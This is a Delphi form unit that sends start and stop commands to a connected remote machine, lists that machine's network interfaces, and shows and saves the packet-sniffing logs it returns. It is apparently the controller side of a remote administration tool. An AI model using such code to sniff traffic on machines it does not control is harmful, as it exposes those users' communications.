unit UnitPortSniffer;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ComCtrls, ExtCtrls, UnitConnection, IniFiles, IdTCPServer,
  Menus;

type
  TFormPortSniffer = class(TForm)
    pnl1: TPanel;
    btn1: TButton;
    redt1: TRichEdit;
    dlgSave1: TSaveDialog;
    cbb1: TComboBox;
    pm1: TPopupMenu;
    S1: TMenuItem;
    procedure btn1Click(Sender: TObject);
    procedure S1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
  private
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    Client: PConnectionDatas;
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
    procedure OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
  end;

var
  FormPortSniffer: TFormPortSniffer;

implementation

uses
  UnitConstants, UnitRepository, UnitFunctions;

{$R *.dfm}
          
constructor TFormPortSniffer.Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
begin
  inherited Create(aOwner);
  Client := ConnDatas;
end;

procedure TFormPortSniffer.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

procedure TFormPortSniffer.OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
var
  MainCommand: string;
begin
  MainCommand := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
  Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

  if MainCommand = PORTSNIFFERINTERFACES then
  begin
    cbb1.Clear;

    while ReceivedDatas <> '' do
    begin
      cbb1.Items.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
    end;

    cbb1.ItemIndex := 0;
  end
  else

  if MainCommand = PORTSNIFFERRESULTS then
  begin
    redt1.Text := redt1.Text + ReceivedDatas;
    redt1.SelStart := Length(redt1.Text);
    SendMessage(redt1.Handle, EM_SCROLLCARET, 0, 0);
  end;
end;

procedure TFormPortSniffer.btn1Click(Sender: TObject);
begin
  if btn1.Caption = 'Start' then
  begin
    btn1.Caption := 'Stop';
    redt1.Clear;
    SendDatas(Client.AThread, PORTSNIFFERSTART + '|' + cbb1.Text);
  end
  else
  begin
    btn1.Caption := 'Start';
    SendDatas(Client.AThread, PORTSNIFFERSTOP + '|');
  end;
end;

procedure TFormPortSniffer.S1Click(Sender: TObject);
var
  TmpStr: string;
begin
  TmpStr := GetUserFolder(Client.Identification);
  dlgSave1.Title := PROGRAMNAME + ' ' + PROGRAMVERSION;
  dlgSave1.InitialDir := TmpStr;
  dlgSave1.FileName := 'SnifferLog_' + MyGetTime('') + '.txt';
  dlgSave1.Filter := '(*.txt)|*.txt';
  dlgSave1.DefaultExt := 'txt';
  if (not dlgSave1.Execute) and (not FileExists(dlgSave1.FileName)) then Exit;
  CreateTextFile(dlgSave1.FileName, redt1.Text);
end;

procedure TFormPortSniffer.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  IniFile: TIniFile;
  TmpStr: string;
begin
  if btn1.Caption = 'Stop' then btn1.Click;

  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  IniFile.WriteInteger('Port sniffer', 'Left', Left);
  IniFile.WriteInteger('Port sniffer', 'Top', Top);  
  IniFile.WriteInteger('Port sniffer', 'Width', Width);
  IniFile.WriteInteger('Port sniffer', 'Height', Height);
  IniFile.Free;
end;

procedure TFormPortSniffer.FormCreate(Sender: TObject);
var
  TmpStr: string;
  IniFile: TIniFile;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  Left := IniFile.ReadInteger('Port sniffer', 'Left', 284);
  Top := IniFile.ReadInteger('Port sniffer', 'Top', 146);
  Width := IniFile.ReadInteger('Port sniffer', 'Width', 601);
  Height := IniFile.ReadInteger('Port sniffer', 'Height', 340);
  IniFile.Free;
end;

end.
